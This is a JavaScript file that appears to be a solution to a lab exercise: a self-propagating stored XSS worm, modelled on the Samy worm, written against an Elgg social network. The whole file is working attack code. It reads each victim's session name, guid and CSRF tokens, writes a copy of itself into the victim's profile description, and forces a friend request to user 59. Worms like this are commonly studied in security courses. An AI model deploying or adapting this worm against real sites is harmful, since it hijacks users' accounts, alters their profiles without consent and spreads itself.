// <script id="worm" type="text/javascript"></script>


window.onload = function() {
    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    //and Security Token __elgg_token
    var userName="&name="+elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    

    var samyGuid = 59; //FILL IN
    var sendurl = "/action/profile/edit"; //FILL IN

    var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; // (1)
    var jsCode = document.getElementById("worm").innerHTML; // (2)
    var tailTag = "</" + "script>"; // (3)
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); // (4)

    //Construct the content of your url.
    var content = "description="+wormCode
    +userName+guid+ts+token;

    if(elgg.session.user.guid != samyGuid) { // (1)
    //Create and send Ajax request to modify profile
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type",
        "application/x-www-form-urlencoded");
        Ajax.send(content);


        //Construct the HTTP request to add Samy as a friend.
        var sendurl = "/action/friends/add?friend=59" + ts + token + ts + token;

        //Create and send Ajax request to add friend
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
}